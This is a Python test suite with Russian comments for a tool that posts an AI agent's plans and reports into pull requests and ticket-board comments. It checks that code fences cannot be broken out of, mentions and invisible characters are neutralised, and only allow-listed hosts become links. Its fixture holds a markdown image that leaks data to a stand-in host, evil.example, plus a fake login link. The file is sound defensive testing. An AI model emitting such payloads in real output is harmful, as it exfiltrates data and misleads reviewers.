"""Безопасный текст в PR и комментариях доски (S25, риск R-4)."""

from __future__ import annotations

import json
from collections.abc import Callable, Mapping
from pathlib import Path

from ario.config import Settings
from ario.publish import MAX_PR_DESCRIPTION
from ario.safe_text import clean, close_open_fence, code_block, inline_code
from ario.ticket_system import render_comment_html
from tests.test_publish import Api, publish_config, world  # noqa: F401  (фикстура world)
from tests.test_publish import run_stage as run_stage  # noqa: PLC0414  (фикстура)

HOSTILE = (
    "Готово. ![нужная картинка](https://evil.example/leak?d=1) и "
    "[надёжная ссылка](https://evil.example/login) и @<c3ebd7c6-0000-0000-0000-000000000001>"
)


# --- примитивы ----------------------------------------------------------------------------------
def test_code_block_cannot_be_closed_from_inside() -> None:
    block = code_block("до\n```\n![x](https://evil)\n```\nпосле")
    lines = block.splitlines()
    assert lines[0] == lines[-1] == "````"  # ограждение длиннее любой цепочки внутри
    assert "```" in lines[2]  # текст внутри не тронут
    assert code_block("простой текст") == "```\nпростой текст\n```"


def test_mentions_are_defused_and_invisible_characters_removed() -> None:
    assert "@<" not in code_block("кому: @<abc-123>")
    assert clean("a​b‮c\x1b[31md\x00e") == "abc[31mde"
    assert clean("a\r\nb\rc") == "a\nb\nc"


def test_inline_code_is_one_line_and_survives_backticks() -> None:
    assert inline_code("Заголовок\nна двух  строках") == "`Заголовок на двух строках`"
    assert inline_code("a`b") == "``a`b``"
    assert inline_code("`x`") == "`` `x` ``"


def test_an_unclosed_block_is_closed_after_a_cut() -> None:
    assert close_open_fence("текст\n```\nкод") == "текст\n```\nкод\n```"
    assert close_open_fence("```\nкод\n```") == "```\nкод\n```"
    assert close_open_fence("````\nа\n```\nб") == "````\nа\n```\nб\n````"


# --- описание PR --------------------------------------------------------------------------------
def description_for(
    run_stage: Callable[..., tuple[str, Api, Settings]],
    *,
    report: str,
    plan: Mapping[str, object] | None = None,
) -> tuple[str, Api]:
    outcome, api, _ = run_stage(report=report, plan=plan)
    assert outcome == "done"
    (create,) = api.created
    return json.loads(create.content)["description"], api


def test_model_text_in_the_pull_request_is_inside_code_blocks(
    run_stage: Callable[..., tuple[str, Api, Settings]],
) -> None:
    plan = {
        "decision": "suitable",
        "plan": [{"step": f"Шаг. {HOSTILE}", "files": ["A.cs"]}],
        "risk": "low",
        "risk_reason": "",
    }
    description, _ = description_for(run_stage, report=HOSTILE, plan=plan)
    # вне блоков кода нет ни одного опасного знака
    outside = []
    inside = False
    for line in description.splitlines():
        if set(line.strip()) == {"`"} and len(line.strip()) >= 3:
            inside = not inside
        elif not inside:
            outside.append(line)
    text_outside = "\n".join(outside)
    assert "evil.example" not in text_outside and "@<" not in description
    assert "![" not in text_outside and "](" not in text_outside
    assert description.count("evil.example") == 4  # план и отчёт сохранены, но как код
    assert not inside  # все блоки закрыты


def test_ticket_title_is_only_inline_code(
    run_stage: Callable[..., tuple[str, Api, Settings]],
) -> None:
    description, _ = description_for(run_stage, report="ok")
    title_line = next(line for line in description.splitlines() if "IntegrationAIAgent" in line)
    assert title_line.startswith("`") and title_line.endswith("`")


def test_description_stays_within_the_limit_and_closes_the_block(
    run_stage: Callable[..., tuple[str, Api, Settings]],
) -> None:
    long_plan = {
        "decision": "suitable",
        "plan": [{"step": "длинный шаг " + "я" * 450, "files": ["A.cs"]} for _ in range(8)],
        "risk": "low",
        "risk_reason": "",
    }
    description, _ = description_for(run_stage, report="р" * 1500, plan=long_plan)
    assert len(description) <= MAX_PR_DESCRIPTION
    fences = [line for line in description.splitlines() if set(line.strip()) == {"`"}]
    assert len(fences) % 2 == 0  # блоки не оборваны


def test_the_rework_reply_in_the_pull_request_is_a_code_block(tmp_path: Path) -> None:
    from types import SimpleNamespace

    from ario.publish import AGENT_REPLY_MARK, _reply_in_pull_request

    (tmp_path / "development-3.md").write_text(HOSTILE, encoding="utf-8")
    sent: list[str] = []

    class Client:
        def __enter__(self) -> Client:
            return self

        def __exit__(self, *exc: object) -> None:
            return None

        def add_pull_request_comment(self, repository: str, pr_id: int, text: str) -> None:
            sent.append(text)

    ctx = SimpleNamespace(
        run_dir=tmp_path, mask=lambda text: text, trace=SimpleNamespace(event=lambda *a, **k: None)
    )
    _reply_in_pull_request(
        ctx,  # type: ignore[arg-type]
        publish_config(),
        lambda config, token: Client(),  # type: ignore[arg-type,return-value]
        "t",
        7,
        1,
    )
    (text,) = sent
    assert text.startswith(f"{AGENT_REPLY_MARK} №1") and "```" in text and "@<" not in text
    head, _, body = text.partition("```")
    assert "evil.example" not in head  # вне блока кода адресов нет


# --- комментарии на доске -----------------------------------------------------------------------
def test_only_own_hosts_become_links_on_the_board() -> None:
    own = "https://rxtfs.example.test/Sungero/_git/R/pullrequest/7"
    text = f"PR {own}, а также {HOSTILE} http://evil.example/x"
    html = render_comment_html(text, link_hosts=["rxtfs.example.test", "tech.example.test"])
    assert f'<a href="{own}">' in html
    assert html.count("<a ") == 1  # чужие адреса остались текстом
    assert "evil.example" in html and 'href="https://evil' not in html
    assert "<a " not in render_comment_html(text)  # без хостов ссылок нет


def test_a_look_alike_host_is_not_linked() -> None:
    html = render_comment_html(
        "https://rxtfs.example.test.evil.example/x и https://evil.example/@rxtfs.example.test",
        link_hosts=["rxtfs.example.test"],
    )
    assert "<a " not in html


def test_invisible_characters_are_removed_from_board_comments() -> None:
    html = render_comment_html("сл​ово‮", link_hosts=[])
    assert html == "слово"


def test_board_reporter_links_only_board_and_code_servers(settings: Settings) -> None:
    from dataclasses import replace

    from ario.reporting import build_reporter
    from ario.ticket_system import TfsTicketSystem

    ready = replace(
        settings,
        tfs_write=True,
        tfs_url="https://tech.example.test/Portfolio",
        tfs_project="P",
        tfs_pat="r",
    )
    reporter = build_reporter(ready, lambda text: text)
    assert isinstance(reporter.system, TfsTicketSystem)
    assert "tech.example.test" in reporter.system._link_hosts  # noqa: SLF001
